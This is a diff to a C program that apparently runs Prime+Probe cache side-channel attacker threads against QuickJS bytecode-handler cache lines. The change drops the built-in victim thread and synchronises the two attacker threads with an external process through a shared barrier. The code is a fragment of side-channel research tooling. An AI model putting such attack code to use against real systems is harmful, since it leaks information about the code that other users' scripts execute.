@@ -34,18 +34,11 @@ static uint64_t *probe_time[cache_line_count];
 static pthread_barrier_t attacker_threads_barrier;
 
 int main(int argc, char **argv) {
-	if (argc < 2) {
-		log_info("usage: %s <js-file>\n", argv[0]);
-		return 1;
-	}
-
-	js_eval_file = argv[1];
-
-	pthread_t thread0 = 0, thread1 = 0, thread2 = 0, thread3 = 0;
+	pthread_t thread0 = 0, thread1 = 0;
 	int err;
 
-    get_config();
-	reset_sync_ctx(QUICKJS_PROJ_ID);
+	get_config();
+	init_sync_ctx(QUICKJS_PROJ_ID);
 	quickjs_get_bytecode_handler_cacheline();
 
 	srand(time(NULL));
@@ -75,7 +68,6 @@ int main(int argc, char **argv) {
 	prepare_evset_thres(
 	    pt_goto16.target, &pt_goto16.evset, &pt_goto16.threshold);
 	prepare_evset_thres(pt_shl.target, &pt_shl.evset, &pt_shl.threshold);
-	// quickjs_test_prepare_evset(pt_sub.target, &pt_sub.evset, &pt_sub.threshold);
 
 	if (pt_goto16.evset == NULL || pt_goto16.threshold == 0 ||
 	    pt_shl.evset == NULL || pt_shl.threshold == 0) {
@@ -85,37 +77,25 @@ int main(int argc, char **argv) {
 		log_info("Build evset for goto16, shl and sub ");
 	}
 
-	quickjs_runtime_thread_config_t vt_config = {
-		js_eval_file,
-		victim_runs,
-		// pinned_cpu0,
-		-1,
-	};
-
 	if (pthread_barrier_init(&attacker_threads_barrier, NULL, 2) != 0) {
 		log_error("Error initializing barrier\n");
 		return -1;
 	}
 
-	err = pthread_create(&thread0, NULL, quickjs_runtime_thread, &vt_config);
-	if (err != 0)
-		log_error("can't create thread0 :[%s]", strerror(err));
+	log_info("Prime+Probe wait for the warmup run");
+	pthread_barrier_wait(sync_ctx.barrier);
+	log_info("Prime+Probe wait for the warmup done");
 
-    log_info("Prime+Probe wait for the warmup run");
-    pthread_barrier_wait(sync_ctx.barrier);
-    log_info("Prime+Probe wait for the warmup done");
-
-	err = pthread_create(&thread1, NULL, PP_attacker_thread, &pt_goto16);
+	err = pthread_create(&thread0, NULL, PP_attacker_thread, &pt_goto16);
 	if (err != 0)
 		log_error("can't create thread1 :[%s]", strerror(err));
 
-	err = pthread_create(&thread2, NULL, PP_attacker_thread, &pt_shl);
+	err = pthread_create(&thread1, NULL, PP_attacker_thread, &pt_shl);
 	if (err != 0)
 		log_error("can't create thread2 :[%s]", strerror(err));
 
 	pthread_join(thread0, NULL);
 	pthread_join(thread1, NULL);
-	pthread_join(thread2, NULL);
 
 	pthread_barrier_destroy(&attacker_threads_barrier);
 
